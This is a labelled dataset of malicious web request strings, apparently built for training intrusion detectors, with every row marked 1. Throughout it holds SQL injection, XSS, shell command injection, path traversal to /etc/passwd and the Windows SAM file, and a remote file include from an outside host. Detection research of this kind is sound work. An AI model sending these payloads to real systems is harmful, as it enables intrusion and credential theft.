sentences 	 labels
/ string & modo = registro & login = gavens0 & password = revirado & nombre = kaya & apellidos = mojeda + batet & email = munshin @ cirugiaplasticacordoba . hk & dni = 65532112y & direccion = plaza + flauta + 16 ,  + 1 ? b & ciudad = valdeavellano + de + tera & cp = 08672 & provincia = teruel & ntc = 689760410233291a & b1 = registrar  	 1
/ scriptpath & index . php ? page = http :  /  / 192 . 168 . 202 . 118 : 8080 / ghl9il ?  	 1
/ string & strings & parameters = -5742 '  where 1314 = 1314 or 5903 =  (  ' qqpjq '  |  |  ( select case 5903 when 5903 then 1 else 0 end from rdb $ database )  |  |  ' qzvzq '  )  --  	 1
/ string & str =  $  ( echo osxami )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \  	 1
/ string & str =  $  ( echo bthzml )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \  	 1
/ raanw4ia . idc ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ string & strings & parameters = 1 '  )  as bzem where 4240 = 4240 ; select sleep ( 5 )  --  	 1
/ top . php ? stuff =  " ver \ x0b > q12768472 & rem \ x0b? stuff =  " ver \ x0b > q12768472 & rem \ x0b  	 1
/  &  &  &  &  &  &  &  &  { file }  	 1
/ webdav & phprun . php ? cmd = wce . exe  	 1
/ classes & auth & openid & message . php ? _env [ asicms ]  [ path ]  = xxpathxx  	 1
/ string & strings & parameters = 1 )  where 9860 = 9860 and 4443 = 4111 --  	 1
/ h4bi26jd . asp ?  < script > document . cookie =  " testhrzx = 1150 ;  "  <  ?  < script > document . cookie =  " testhrzx = 1150 ;  "  <  / script >  	 1
/ help . php ? q =  "  & ping \ x0b-w \ x0b9000 \ x0b-n \ x0b1 \ x0b1 . 2 . 3 . 4 & rem \ x0b? q =  "  & ping \ x0b-w \ x0b9000 \ x0b-n \ x0b1 \ x0b1 . 2 . 3 . 4 & rem \ x0b  	 1
/ cgi-home & fileseek2 . cgi ? foot =  ; cat  / etc / passwd & head =  	 1
/ string & modo = registro & login = quan & password = l71o7o6ne4 & nombre = hermnn & apellidos = estaragu + corts & email = girls @ viscotek . mh & dni = 62336583m & direccion = murill * o ,  + s &  * n ,  + 3 +  ? g & ciudad = aras & cp = 37727 & provincia = granada & ntc = 3043074301340407 & b1 = registrar  	 1
/ string & strings & parameters = "  | echo $ ifshasppt $  (  ( 51 + 64 )  )  $  ( echo $ ifshasppt ) hasppt  	 1
/ d44uk9h2 . idc ?  < script > document . cookie =  " testmybc = 2088 ;  "  <  ?  < script > document . cookie =  " testmybc = 2088 ;  "  <  / script >  	 1
/ shopping & shopdisplayproducts . asp ? id = 1 & cat =  < script > alert (  ' test '  )  <  / script >  	 1
/ string & strings & parameters = < img + src =  " jav	ascript : alert ( 1 )  ;  "  >  	 1
/ main . php ? logout =  "  ; rm q17425978  #? logout =  "  ; rm q17425978  #  	 1
/ j4drbkil . dll ?  < script > cross_site_scripting . nasl <  ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ string & strings & parameters = &  sleep 0  &  &  str =  $  ( echo zepvfu )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  '  	 1
/ search . php ? config [  \  " sipssys \  "  ]  = http :  ? config [  \  " sipssys \  "  ]  = http :  /  / cirt . net / rfiinc . txt ?  	 1
/ string & modo = registro & login = z * iqia ,  * ng & password = sinttica & nombre = deodato & apellidos = chen + balia & email = chalon @ ingenelec . gl & dni = 00776957v & direccion = calle + la + baeza + 52 +  & ciudad = remolinos & cp = 18570 & provincia = castelln & ntc = 7967285688712382 & b1 = registrar  	 1
/ string & strings & parameters = ;  str =  $  ( echo tsxscx )  ;  str1 =  $  {  # str }  ;  if  [  7 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \  	 1
/ string & strings & parameters = 1 '  )  )  )  or exp (  ~  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 6270 = 6270 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) x )  )  and  (  (  (  ' jwbt '  =  ' jwbt  	 1
/ cgi-sys & gwweb . exe ? help = bad-request  	 1
/ recordings & man-cgi ? section = 0 & topic = ls ; id  	 1
/ string & strings & parameters = '  ;  str =  $  ( echo ghehaj )  ;  str1 =  $  {  # str }  ;  if  [  7 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  |  	 1
/ string & strings & parameters = < marquee & finish = confirm ( 2 )  >  &  	 1
/ string & strings & parameters = '  |   [  6 -ne  $  ( echo qptcde  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  	 1
/ openview5 . exe ? target = main & action =  .  .  ? target = main & action =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / windows / win . ini  	 1
/ clk ; 38417351 ; 7163019 ; g &  	 1
/ examples & jsp & num & library & adodb & server . php ? sql =  ' adodb_sql_sql_injection . nasl  	 1
/ extras & poll & poll . php ? file_newsportal = xxpathxx  	 1
/ string & strings & parameters = 1 %  '  )  )  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 )  , 0 )  , 500000000 )  , null )  else char ( 108 )  |  | char ( 76 )  |  | char ( 112 )  |  | char ( 116 )  end )  from information_schema . system_users )  and  (  (  '  %  '  =  '  	 1
/ string & strings & parameters = 1 ; iif ( 2869 = 9448 , 1 , 1 & 0 )  	 1
/ modules & mydownloads & ratefile . php ? lid = 1 "  >  < script > alert (  ' wvs-xss-magic-string-413185588081 '  )  ;  <  / script >  < br name =  " nothing  	 1
/ 606wkcop . nsf ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ string & strings & parameters = echo $ ifsmfymxe $  (  ( 53 + 41 )  )  $  ( echo $ ifsmfymxe ) mfymxe '  	 1
/ string & modo = entrar & login = jasver9 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & pwd = 76r9v3t2 & remember = off & b1 = entrar  	 1
/ de3v2dd9 . mscgi ?  < script > cross_site_scripting . nasl <  ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ string & strings & parameters = -6554 '  )  )  )  union all select 4384 , 4384 , 4384 , 4384 , 4384 #  	 1
/ help . php ? q =  " uname \ x09 > q12928131 \ x09 #? q =  " uname \ x09 > q12928131 \ x09 #  	 1
/ byrg33fw . pl ?  < meta http-equiv = set-cookie content =  " testexuu = 5340 "  >?  < meta http-equiv = set-cookie content =  " testexuu = 5340 "  >  	 1
/ raanw4ia . php3 ?  < script > cross_site_scripting . nasl <  ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ string & strings & parameters = "   str =  $  ( echo sfurkw )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  	 1
/ recordings & index . php ? src = 1 & _common = 1 & time = 1331919010 & action = show_view & module = calendarmodule & view =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ string & strings & parameters = < body onload !  #  $  %  &  (  )  *  ~  + -_ .  ,  :  ;  ?  @  [  /  |  \  \  ]  ^  `  = document . cookie = true ;  >  	 1
/ cgi-bin & search . jsp ? q =  %  "  < script > alert ( 1331918998 )  <  / script >  	 1
/ moodle & filter & tex & texed . php ? formdata = foo & pathname = foo "  ; ls + -l ; chmod + 555 +  / tmp / xjmtpvepcz ;  "  	 1
/ string & strings & parameters = & echo $ ifsrgsnff $  (  ( 14 + 60 )  )  $  ( echo $ ifsrgsnff ) rgsnff '  	 1
/ string & strings & parameters = 1 %  "  "  )  and row ( 6237 , 7469 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 6237 = 6237 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and  (  "  "  %  "  "  =  "  "  	 1
/ scripts & dcforum . cgi ? az = list & forum =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ string & strings & parameters = 1 "  "  and 3707 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  and  "  " hvwv "  "  =  "  " hvwv  	 1
/ examples & jsp & jsp2 & jspx ? username =  "  < script > foo <  / script  	 1
/ modules & calendar & scheme . php ? calpath = xxpathxx ?  	 1
/ cgi-bin & dsweb & services & user-1 "  >  < body onload = alert (  ' xerox_docushare_dsweb_xss . nasl '  )  >  	 1
/ scripts & spaw & dialogs & confirm . php ? spaw_root =  / etc / passwd \ x00  	 1
/ string & strings & parameters = 1 '  )  )  )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end )  )  and  (  (  (  ' gsjp '  =  ' gsjp  	 1
/ o1zj4u9v . do ?  < meta http-equiv = set-cookie content =  " testabrn = 6368 "  >?  < meta http-equiv = set-cookie content =  " testabrn = 6368 "  >  	 1
/ string & strings & parameters = 1 )  )  )  and char ( 120 )  |  | char ( 106 )  |  | char ( 117 )  |  | char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 )  , 0 )  , 5000000000 )  , null )  and  (  (  ( 7484 = 7484  	 1
/ string & modo = insertar '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  ' % & precio = 6072 & b1 = pasar + por + caja  	 1
/ string & strings & parameters = '  &  sleep 0  &  &  str =  $  ( echo ausqym )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  &  &  	 1
/ string & strings & parameters = or 1 &  *  	 1
/ string & strings & parameters = & lt ; meta http-equiv =  \  " link \  "  content =  \  "  & lt ; http &  # 58 ;  &  & ha &  # 46 ; ckers &  # 46 ; org & xss &  # 46 ; css & gt ;  ;  rel = stylesheet \  "  & gt ;  	 1
/ examples & jsp & colors & shopexd . asp ? catalogid =  ' 42  	 1
/ string & strings & parameters = |  | echo $ ifsyxcwnr $  (  ( 16 + 34 )  )  $  ( echo $ ifsyxcwnr ) yxcwnr  	 1
/ cgi & pfdispaly . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ string & strings & parameters = & lt ; img src = javascript &  # 058 ; alert (  ' xss '  )  & gt ;  	 1
/ 5qnlm5z2 . dll ?  < meta http-equiv = set-cookie content =  " testsixi = 8451 "  >?  < meta http-equiv = set-cookie content =  " testsixi = 8451 "  >  	 1
/ string & strings & parameters = &  sleep 0  &  &  str =  $  ( echo usnhdt )   &  &  str1 =  $  {  # str }   &  &   [  4 -eq  $  { str1 }   ]   &  &  sleep 1  "  	 1
/ modules . php ? name = your_account & op = userinfo & username = bla < script > alert ( document . cookie )  <  ? name = your_account & op = userinfo & username = bla < script > alert ( document . cookie )  <  / script >  	 1
/ aj3pf49c . htm ?  < meta http-equiv = set-cookie content =  " testnofv = 4170 "  >?  < meta http-equiv = set-cookie content =  " testnofv = 4170 "  >  	 1
/ vjbrrppi . cfc ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ string & strings & parameters = + if ( benchmark ( 3000000 , md5 ( 1 )  )  , null , null )  , null , null )   --  	 1
/ string & strings & parameters = 1 where 7072 = 7072 or row ( 1045 , 7562 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 1045 = 1045 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  --  	 1
/ string & strings & parameters = < div onfocus = alert (  ' xx '  )  id = xss style = display : table >  	 1
/ string & strings & parameters = < meta charset =  " mac-farsi "  > ¼script¾javascript : alert ( 1 ) ¼ & script¾  	 1
/  .  .  &  &  &  .  .  &  &  &  { file }  	 1
/ mpcgi & msmmask . exe ? mask =  / junk334  	 1
/ cgi-perl & ion-p . exe ? page = c :  \ winnt \ repair \ sam  	 1
/ examples & jsp & error & apps & pbcs . dll & misc ? url =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / boot . ini  	 1
/ tukodz3j . jspa ?  < script > cross_site_scripting . nasl <  ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ string & strings & parameters = ;  str =  $  ( echo yuqked )  ;  str1 =  $  {  # str }  ;  if  [  3 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  '  	 1
/ string & strings & parameters = $  { system ( print (  ` echo cklwbh echo  $  (  ( 38 + 7 )  )  echo cklwbh echo cklwbh `  )  ;  .  " cklwbh  	 1
/ string & strings & parameters = 1 "  "  )  as klur where 7046 = 7046 and 3202 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 & 2 )  )  )  )  --  	 1
/  &  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  & etc & passwd  	 1
/ phpmyadmin & index . php ? string =  '  	 1
/ javascript &  . passwd . db  	 1
/ string & strings & parameters = "  `  '  >  < script >  \ xe2 \ x80 \ x83javascript : alert ( 1 )  <  & script >  	 1
/ string & id = 2 & nombre = jamn + ibrico & precio = 100 & cantidad = 89 & b1 =  < script > alert (  " paros "  )  ;  <  & script >  	 1
/ string & strings & parameters = 1 %  '  or char ( 117 )  |  | char ( 111 )  |  | char ( 105 )  |  | char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  and  '  %  '  =  '  	 1
/  .  &  &  .  &  .  &  &  .  &  .  &  &  .  &  .  &  &  .  &  .  &  &  .  &  { file }  	 1
/ string & strings & parameters = shopdisplayproducts . asp ? id = 1 & cat =  < script > alert ( document . cookie )  <  / script >  	 1
/ cgi-local & ion-p . exe ? page = c :  \ winnt \ repair \ sam  	 1
/ string & strings & parameters = "  |  | echo bqpbue $  (  ( 6 + 80 )  )  $  ( echo bqpbue ) bqpbue  	 1
/ string & modo = insertarbob @  < script > alert ( paros )  <  & script >  . parosproxy . org & precio = 7832 & b1 = confirmar  	 1
/ string & str =  $  ( echo gqpjfy )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  |  	 1
/ string & strings & parameters = 1 %  "  "  )  )  )  and 9254 =  ( select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 )  --  	 1
/ javascript &  . passwd . temp  	 1
/ scripts & phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331918976 & lang_crm =  .  .  /  .  .  / vtigerservice . php \ x00  	 1
/ order & login . php ? svr_rootscript =  @ rfiurl  	 1
/ string & strings & parameters = -3885 )  where 2387 = 2387 union all select 2387 , 2387 , 2387 , 2387 , 2387 , 2387 , 2387 #  	 1
/ wapchat & src & eng . resultmember . php ? sysfiledir = xxpathxx  	 1
/ string & strings & parameters = '  & echo zxujmm $  (  ( 66 + 53 )  )  $  ( echo zxujmm ) zxujmm &  &  	 1
/ string & strings & parameters = -6389 "  "  union all select 2355 , 2355 , 2355 , 2355 , 2355 --  	 1
/ string & strings & parameters = 23 '  limit 1 , 1 union all select concat ( 0x3a6d70663a , ifnull ( cast ( database (  )  as char )  , 0x20 )  , 0x3a736e623a )  #  --  	 1
/ ap58k3ci . do ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ scs86g1p . aspx ?  < meta http-equiv = set-cookie content =  " testquyx = 2820 "  >?  < meta http-equiv = set-cookie content =  " testquyx = 2820 "  >  	 1
/ string & strings & parameters = < svg onload  =  alert (  '  &  # x000005cu0031 '  )  >  	 1
/ 82q7ywa8 . php3 ?  < script > document . cookie =  " testpwew = 1315 ;  "  <  ?  < script > document . cookie =  " testpwew = 1315 ;  "  <  / script >  	 1
/ string & strings & parameters = "  &  sleep 0  &  &  str =  $  ( echo zstlvq )   &  &  str1 =  $  {  # str }   &  &   [  7 -eq  $  { str1 }   ]   &  &  sleep 1  &  	 1
/ string & strings & parameters = "  |   [  9 -ne  $  ( echo nreisi  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  |  	 1
/  < meta http-equiv = set-cookie content =  " testpokn = 7494 "  >  	 1
/ string & strings & parameters = -1396 where 5838 = 5838 or 9323 = 9323 #  	 1
/ string & strings & parameters = &  & echo $ ifslukzzl $  (  ( 74 + 87 )  )  $  ( echo $ ifslukzzl ) lukzzl &  	 1
/ string & modo = registroand + 1 = 1 & login = waytowic & password = engargolar & nombre = renato & apellidos = membrives + larragoiti & email = alvarez_barwick @ 906 . com . tv & dni = 61170907s & direccion = c &  + max + aub + 121 + 9-a & ciudad = cilln & cp = 20213 & provincia = vila & ntc = 0093197595343977 & b1 = registrar  	 1
/ 5qnlm5z2 . mscgi ?  < script > document . cookie =  " testsixi = 8451 ;  "  <  ?  < script > document . cookie =  " testsixi = 8451 ;  "  <  / script >  	 1
/ string & strings & parameters = < comment >  < img src =  "  <  & comment >  < img src = x onerror = javascript : alert ( 1 )  )  &  &  "  >  	 1
/ examples & jsp & num & edit_image . php ? dn = 1 & userfile =  / etc / passwd & userfile_name =   ; id ;  	 1
/ scripts & mail . php ? id =  '  /  *  *  / union /  *  *  / select /  *  *  / 1 , 2 , 1332010419 , 4 --  & blog = 1  	 1
/ dda2qr7j . x ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ main . php ? logout =  "  | sleep \ x0911 \ x09 #? logout =  "  | sleep \ x0911 \ x09 #  	 1
/ fpnpp5zg . cfm ?  < script > document . cookie =  " testyias = 101 ;  "  <  ?  < script > document . cookie =  " testyias = 101 ;  "  <  / script >  	 1
/ string & strings & parameters = waitfor delay  ' 0 : 0 : 20 '   --  	 1
/ help . php ? q =  "  \ x0drm \ x09q41994252 \ x09 #? q =  "  \ x0drm \ x09q41994252 \ x09 #  	 1
/ zroo33l4 . php ?  < meta http-equiv = set-cookie content =  " testiklc = 904 "  >?  < meta http-equiv = set-cookie content =  " testiklc = 904 "  >  	 1
/ string & strings & parameters = < frameset >  < frame src =  " xss "  >  <  & frameset >  	 1
/ main . php ? stuff =  & ver ;  > q26155749 & rem ;? stuff =  & ver ;  > q26155749 & rem ;  	 1
/ igtf0zon . mscgi ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ string & modo = entrar & login = robles & pwd = bob @  < script > alert ( paros )  <  & script >  . parosproxy . org & remember = off & b1 = entrar  	 1
/ claroline180rc1 & claroline & inc & lib & import . lib . php ? includepath = xxpathxx ?  	 1
/ string & strings & parameters = 1 %  "  "  )  and 4386 = utl_inaddr . get_host_address ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  and  (  "  "  %  "  "  =  "  "  	 1
/ string & modo = registro & login = hosang & password = helespontiaca & nombre = yodalia & apellidos = garay & cott + barnes & email = hepburn_spinnell @ 17horas . sb & dni = 03749375f & direccion = antonio + ulloa + 98 + 3h & ciudad = entrena & cp = 50500 & provincia = badajoz & ntc = 8391447645133065 & b1 = registrar  	 1
/ javascript & webwork . exe  	 1
/ string & strings & parameters = -5210 "  "  )  where 7176 = 7176 or 6872 = 6872 --  	 1
/ string & modo = registro & login = jui6 & password = hamaca & nombre = adelqui & apellidos = blaya + varcarcel & email = bousen @ cumbareback . uk & dni = 45388096b & direccion = c &  + virgen + de + las + cruces ,  + 128 ,  + 12a  & ciudad = pineda + de + gigela & cp = 24921 & provincia = ciudad + real & ntc = 7123664796542745 & b1 = registrar  	 1
/ string & strings & parameters = |   [  2 -ne  $  ( echo qjdbjn  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  	 1
/ string & strings & parameters = & echo $ ifshbnwjw $  (  ( 18 + 27 )  )  $  ( echo $ ifshbnwjw ) hbnwjw &  	 1
